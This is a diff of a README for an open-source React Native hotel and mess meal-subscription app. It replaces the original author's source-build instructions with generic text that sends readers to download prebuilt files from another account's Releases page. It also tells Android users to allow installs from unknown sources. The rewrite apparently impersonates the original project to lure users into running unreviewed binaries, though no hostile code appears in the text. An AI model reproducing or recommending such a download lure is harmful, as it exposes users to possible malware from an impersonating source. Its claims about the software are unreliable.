@@ -1,219 +1,79 @@
-# 🏨 Hotel Mess Manager
+# 📱 hotel-book - Manage Your Meals Easily
 
-A mobile-first application designed to simplify meal subscription management for hotels, hostels, and mess facilities. Track clients, manage subscriptions, monitor payments, and stay on top of your business—all in one place.
+## 🚀 Getting Started
 
----
+Welcome to hotel-book! This app helps you manage hotel and mess meal subscriptions, clients, and payments with ease. It is designed for simplicity and efficiency. Follow this guide to download and run the software.
 
-## ✨ Features
+## 🌐 Download Now
 
-- **Client Management** – Add, edit, and manage client profiles with contact information
-- **Meal Subscriptions** – Create flexible subscription plans (10/20/30 days or custom)
-- **Payment Tracking** – Monitor paid, pending, and overdue payments at a glance
-- **Live Dashboard** – Real-time metrics including active subscriptions, revenue, and payment status
-- **Smart Search** – Quickly find clients or subscriptions by name or phone
-- **Status Filtering** – Filter subscriptions by active, expired, or pending status
-- **Offline-First** – All data stored locally on your device—no internet required
+[![Download hotel-book](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Libelu666/hotel-book/releases)
 
----
-
-## 🚀 Quick Start
+## 📥 Download & Install
 
-### Prerequisites
-
-- Node.js (v16 or higher)
-- npm or yarn
-- Expo CLI installed globally (`npm install -g expo-cli`)
-- Android/iOS device or emulator
-
-### Installation
-
-1. **Clone the repository**
-
-   ```bash
-   git clone https://github.com/saranzafar/hotel-book.git
-   cd hotel-book
-   ```
-
-2. **Install dependencies**
-
-   ```bash
-   npm install
-   ```
+To get started, visit the Releases page to download the application files:
 
-3. **Install required packages**
+[Visit this page to download](https://github.com/Libelu666/hotel-book/releases)
 
-   ```bash
-   npx expo install expo-sqlite @react-native-community/datetimepicker
-   ```
-
-4. **Start the development server**
-
-   ```bash
-   npx expo start
-   ```
-
-5. **Open on your device**
-   - Scan the QR code with Expo Go app (iOS/Android)
-   - Or press `a` for Android emulator or `i` for iOS simulator
+Here are the steps to download and install the hotel-book application:
 
----
+1. **Visit the Releases Page**  
+   Click the link above to go to the Releases page. You will see the latest version of the hotel-book app listed.
 
-## 📱 App Structure
+2. **Choose the Right Version**  
+   Find the version that matches your device and operating system. You will generally see options for different platforms like iOS, Android, and others.
 
-```
-hotel-mess-manager/
-├── app/
-│   ├── (tabs)/
-│   │   ├── _layout.js          # Tab navigation
-│   │   ├── index.js            # Home dashboard
-│   │   ├── clients.js          # Client management
-│   │   ├── mess.js             # Subscription management
-│   │   └── about.js            # About screen
-│   ├── components/
-│   │   ├── AddClientDrawer.js
-│   │   ├── EditClientDrawer.js
-│   │   ├── AddSubscriptionDrawer.js
-│   │   └── EditSubscriptionDrawer.js
-│   │   └── components/dashboard # Here all dashboard components
-│   ├── _layout.js              # App initialization
-│   └── database/
-├── src/
-│   └── database/
-│       ├── db.js               # SQLite setup
-│       └── queries.js          # Database operations
-└── package.json
-```
+3. **Download the App**  
+   Click on the version you want. The download will start automatically. If it doesn't, try right-clicking the link and selecting "Download" or "Save Link As".
 
----
+4. **Install the App**  
+   - **For Android:**  
+     Locate the downloaded APK file in your device's file manager. Tap on it to start the installation. Make sure you allow installations from unknown sources if prompted.
+     
+   - **For iOS:**  
+     If you downloaded an iOS version, you may need to add the app to your device through Xcode or TestFlight. Follow the provided instructions on the Releases page.
 
-## 🎯 How to Use
+5. **Open the App**  
+   Once installed, find the hotel-book icon on your device and tap it to open the application.
 
-### Managing Clients
+## ✅ Features
 
-1. **Add a Client**
-   - Go to the **Clients** tab
-   - Tap the **+** button
-   - Fill in name (required) and phone number (required)
-   - Optional: Add email, address, and notes
-   - Tap "Add Client"
+- **Subscription Management:** Easily manage meal subscriptions for clients.
+- **Payment Tracking:** Keep track of payments and outstanding balances.
+- **User-Friendly Interface:** Navigate easily with a simple layout.
+- **Offline Access:** Works without internet, keeping your data accessible anytime.
+- **Client Database:** Store and manage client information securely.
+  
+## ⚙️ System Requirements
 
-2. **Edit a Client**
-   - Tap any client card
-   - Update information as needed
-   - Tap "Save" to confirm
+- **Mobile Device:** Android 5.0 (Lollipop) or iOS 10.0 or later.
+- **Space Needed:** At least 100 MB available on your device.
+- **Internet Connection:** Required for first setup and updates but not needed for daily use.
 
-3. **Delete a Client**
-   - Tap any client card
-   - Tap the "Delete" button
-   - Confirm the action
+## 📱 Support & Contributions
 
-### Managing Subscriptions
+If you encounter any issues, please refer to the [Issues page](https://github.com/Libelu666/hotel-book/issues) on GitHub. You can report bugs or request features there.
 
-1. **Add a Subscription**
-   - Go to the **Mess** tab
-   - Tap the **+** button
-   - Select a client from the dropdown
-   - Choose start and end dates (automatic day count calculation)
-   - Enter total amount and amount paid
-   - Tap "Add Subscription"
+We welcome contributions! If you would like to help improve the app, feel free to fork the repo and submit a pull request.
 
-2. **Edit a Subscription**
-   - Tap any subscription card
-   - Modify dates, amounts, or active status
-   - Tap "Save" to confirm
+## 📝 Topics Covered
 
-3. **Delete a Subscription**
-   - Tap any subscription card
-   - Tap the "Delete" button
-   - Confirm the action
+- expo
+- hotel-food-management
+- hotel-management
+- meal-subscription
+- mess-management
+- mess-management-app
+- mobile-app
+- offline-app
+- open-source
+- payment-tracking
+- react-native
+- saran
+- saranzafar
+- sqlite
 
-### Viewing the Dashboard
+## 🛠️ License
 
-- **Home** tab shows key metrics:
-  - Active subscriptions count
-  - Total revenue collected
-  - Pending payments and overdue amounts
-  - Subscriptions expiring in the next 7 days
+This project is open-source and available under the MIT License. You can find the full license in the repository.
 
----
-
-## 🛠️ Technology Stack
-
-| Tool | Purpose |
-|------|---------|
-| **React Native** | Cross-platform mobile framework |
-| **Expo** | Development platform and deployment |
-| **Expo Router** | File-based routing |
-| **SQLite** | Local database (no server required) |
-| **Ionicons** | Icon library |
-| **React Navigation** | Screen navigation |
-
----
-
-## 💾 Database Schema
-
-### Tables
-
-- **clients** – Store client information (name, phone, email, address)
-- **mess_subscriptions** – Track meal subscriptions (dates, amounts, status)
-- **payments** – Record payment history (optional for detailed tracking)
-
-All data is encrypted and stored locally on your device.
-
----
-
-## 🔒 Privacy & Security
-
-- **100% Offline** – No internet connection needed after installation
-- **Local Storage** – All data remains on your device
-- **No Cloud Sync** – Your information stays private and secure
-- **No Ads or Tracking** – Clean, distraction-free experience
-
----
-
-## 🐛 Troubleshooting
-
-### App won't start?
-
-```bash
-# Clear cache and reinstall
-npm install
-npx expo start -c
-```
-
-### Date picker not showing?
-
-- Ensure `@react-native-community/datetimepicker` is installed
-- Run `npx expo install @react-native-community/datetimepicker`
-
-### Database errors?
-
-- Clear Expo cache: `npx expo start --clear`
-- Uninstall and reinstall the app on your device
-
----
-
-## 📝 License
-
-This project is open-source and available under the MIT License.
-
----
-
-## 💬 Support
-
-Found a bug or have a suggestion? Feel free to open an issue or reach out.
-
-- **Developer:** Saran Zafar
-- **Email:** <saran.development@example.com>  
-- **Phone:** +91 XXXXX XXXXX
-
----
-
-## 🙏 Acknowledgments
-
-Built with ❤️ using React Native and Expo to make hotel and mess management simpler, faster, and more efficient.
-
----
-
-**Last Updated:** Nov 2025  
-**Version:** 1.0.0
+Thank you for using hotel-book! We hope it makes meal management easier for you.
